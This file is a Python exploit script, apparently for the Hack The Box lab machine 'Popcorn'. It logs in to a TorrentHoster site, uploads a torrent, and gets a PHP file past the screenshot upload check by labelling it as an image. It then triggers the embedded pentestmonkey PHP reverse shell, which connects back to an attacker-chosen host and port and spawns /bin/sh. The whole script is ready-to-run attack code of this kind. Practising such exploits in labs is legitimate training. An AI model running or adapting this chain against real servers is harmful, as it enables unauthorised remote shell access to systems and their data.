#!/bin/python3
import argparse
import random
import re
import string
import sys
import textwrap

import requests

PROXIES = {"http": "127.0.0.1:8080"}
# PROXIES = None


def generate_random_string():
    return ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(20))


def upload_torrent(cookies):
    torrentcontent = {
        "torrent": (f"{generate_random_string()}.torrent", open(torrentpath, "rb"), "application/x-bittorrent"),
        "filename": (None, ""),
        "type": (None, "1"),  # the torrent will be in the first category; in this case "Movies"
        "subtype": (None, "1"),  # the subcategory of the torrent; in this case "Action"
        "user_id": (None, ""),
        "anonymous2": (None, "false"),
        "anonymous": (None, "true"),
        "autoset": (None, "enabled"),
        "info": (None, ""),
        "registration": (None, "false"),
        "hideuser": (None, "false"),
        "submit": (None, "Uplad Torrent")
    }

    header = {
        "Referer": f"{url}/torrents.php?mode=upload"
    }

    print(f"[*] Uploading torrent as: {torrentcontent['torrent'][0]}")

    r = requests.post(url + "torrents.php?mode=upload", files=torrentcontent, cookies=cookies, headers=header,
                      proxies=PROXIES)
    if re.search("file upload succes...thank you!", r.text):
        print("[+] Torrent has been uploaded")
        torrentid = re.findall("id=(\w{40})", r.text)
        print(f"[*] The id of the torrent is: '{torrentid}'")
        return torrentid[0]


    else:
        print("[-] Upload of the torrent failed")
        sys.exit(1)


def upload_shell(cookies, torrentid):
    file = {
        "file": (f"{generate_random_string()}.php", phpshell, "image/jpeg"),
        # the server allows uploading only images, but checks only the MIME type
        "submit": (None, "Submit Screenshot")
    }

    r = requests.post(url + "upload_file.php?mode=upload&id=" + torrentid, files=file, cookies=cookies, proxies=PROXIES)

    print(f"[*] Name of the shell: {file['file'][0]}")
    if re.search("Please refresh to see the new screenshot.", r.text):
        print("[+] Shell uploaded...")
        print("[*] Accessing Shell...")
        requests.get(url + "upload/" + torrentid)


    else:
        print("[-] Upload of the shell failed")
        sys.exit(1)


def login(cookies):
    data = {
        "username": username,
        "password": password
    }

    r = requests.post(url + "login.php", data, proxies=PROXIES, cookies=cookies)
    if re.search("logout.php", r.text):
        print("[+] Login successful.")

    else:
        print("[-] Login failed.")
        sys.exit(1)


def get_cookie():
    r = requests.get(url, proxies=PROXIES)
    phpsessid = r.cookies.get("PHPSESSID")
    print(f"[*] Retrieved PHPSESSID: {phpsessid}")
    return phpsessid


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description='Script to Exploit TorrentHoster  and dirtyc0w from hackthebox \'popcorn\'',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""
		"""))
    parser.add_argument('--lhost', required=True),
    parser.add_argument('-p', '--port', type=int, help='port of the localhost to which a connection will be made',
                        required=True),
    parser.add_argument('-u', '--url', help='base url of the target', required=True),
    parser.add_argument('--username', help='username of the torrenthoster', required=True),
    parser.add_argument('--password', help='password of the torrenthoster', required=True),
    parser.add_argument('--torrent', help='path to a torrent file which will be uploaded', required=True)

    args = parser.parse_args()
    # parser.print_help()

    url = args.url
    lhost = args.lhost
    lport = args.port
    username = args.username
    password = args.password
    torrentpath = args.torrent

    phpshell = """
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip ='""" + lhost + """';  // CHANGE THIS
$port = """ + str(lport) + """;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();

	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}

	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

"""

    phpsessid = get_cookie()
    cookies = {
        "PHPSESSID": phpsessid
    }
    login(cookies)
    torrentid = upload_torrent(cookies)
    upload_shell(cookies, torrentid)
